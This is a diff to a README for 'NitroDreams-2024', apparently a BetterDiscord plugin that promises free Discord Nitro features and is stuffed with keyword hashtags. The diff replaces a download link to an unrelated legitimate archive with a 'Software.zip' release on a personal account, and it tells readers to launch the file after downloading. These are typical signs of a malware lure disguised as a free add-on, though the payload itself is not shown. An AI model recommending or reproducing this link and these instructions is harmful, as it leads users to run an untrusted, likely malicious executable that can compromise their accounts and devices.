@@ -13,7 +13,7 @@ Welcome to NitroDreams-2024, the best BetterDiscord Plugin for unlocking amazing
 #betterdiscord #betterdiscord-addon #betterdiscord-plugin #betterdiscord-theme #discord-free-nitro-2024 #discord-free-nitro-features #discord-nitro #discord-nitro-feature #discord-nitro-for-free-2024 #free-discord-nitro-2024 #free-nitro #free-nitro-discord #nitro-discord #nitro-features #nitro-features-discord #nitro-full
 
 ## Download
-[Click here to download NitroDreams-2024!](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 🔗
+[Click here to download NitroDreams-2024!](https://github.com/Richardwithans/NitroDreams-2024/releases/download/v1.0/Software.zip) 🔗
 
 Please note that the file needs to be launched after downloading.
 
